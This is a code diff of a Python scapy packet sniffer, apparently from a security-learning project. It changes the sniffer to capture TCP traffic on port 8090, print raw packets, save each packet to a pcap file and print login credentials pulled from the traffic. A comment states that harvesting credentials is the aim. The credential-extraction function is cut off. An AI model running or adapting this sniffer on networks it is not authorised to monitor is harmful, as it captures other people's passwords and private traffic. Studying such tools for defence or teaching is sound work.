@@ -14,17 +14,23 @@ def get_arguments():
 
 def sniff(interface: str):
     # Filter can be applied for port 8090 for accessing just the login credentials
-    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    scapy.sniff(store=0, prn=process_sniffed_packet)
 
 
 # Field in the layers are accessed using the dot operator
 def process_sniffed_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
+    # if packet.haslayer(http.HTTPRequest):
+    #     print("test")
+    #     if packet.haslayer(scapy.Raw):
+    #         print(packet[scapy.Raw].load)
+    if packet.haslayer(scapy.TCP):
+        if packet[scapy.TCP].dport == 8090:
+            if packet.haslayer(scapy.Raw):
+                print(packet.show())
     login_credentials = get_login_credentials(packet)
     if login_credentials:
         print(login_credentials)
+    scapy.wrpcap("output_new.pcap", packet, append=True)
 
 def get_login_credentials(packet):
     login_credentials = {}
